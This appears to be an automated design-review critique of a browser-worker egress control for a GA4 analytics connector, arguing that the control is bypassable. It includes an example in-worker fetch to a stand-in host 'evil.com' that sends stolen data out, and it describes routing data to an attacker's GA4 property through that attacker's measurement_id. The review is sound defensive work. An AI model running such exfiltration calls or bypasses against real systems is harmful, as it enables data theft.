---
slice: 016-01 — GA4 wire-protocol endpoint ceiling (the EXACT archetype)
pass: frame-critique
verdict: needs-changes
reviewer: jig:reviewer
reviewed_at: 2026-08-30T23:57:39Z
prompt_source: review.py frame-critique 016-01
---

## Frame-critique — 016-01 (GA4 wire-protocol ceiling) — NEEDS-CHANGES (confirmed real)

**Primary (load-bearing):** the ceiling at the `worker.onmessage → fetch(r.url)` seam only has
foreign-sink TEETH if that seam is the chamber's SOLE egress. It is NOT: the GA4 chamber
(`core/chamber.worker.js`) does not strip ambient `fetch`/XHR/WebSocket — `applyEgressConfinement` is
wired into ALLOY only. A compromised GA4 `handle` can call `self.fetch("https://evil.com", {body:stolen})`
in-worker, never populate `ready`, and the ceiling never sees it. So "a compromised GA4 chamber cannot
exfiltrate" is FALSE — the ceiling as-drafted only catches an honest-but-buggy connector posting to the
wrong DECLARED endpoint, and AC7's "fake worker emitting a foreign-sink ready request" is a strawman
adversary (a real one bypasses `ready`). Fix: either (a) add GA4-chamber network-confinement (make
`ready` the sole egress) + rewrite AC7 to prove a direct in-worker fetch is DENIED, or (b) downgrade the
value to ADR-0006's careful GA4 framing (disclosure + forward-compat least-privilege + defense against
honest misconfiguration) and drop "cannot exfiltrate."

**Secondary (residual, not a frame-breaker):** origin+pathname drops the query, so it can't distinguish
our GA4 property from an attacker's — a compromised chamber posts to the SAME
`www.google-analytics.com/mp/collect` with the ATTACKER's `measurement_id`/`api_secret` → allowed. This
is GA4's same-host tenant re-route (the `measurement_id` IS GA4's tenant key, in the query) — the exact
threat 015 deferred for GA4. Name it as an explicit residual, don't frame query-dropping as pure benefit.
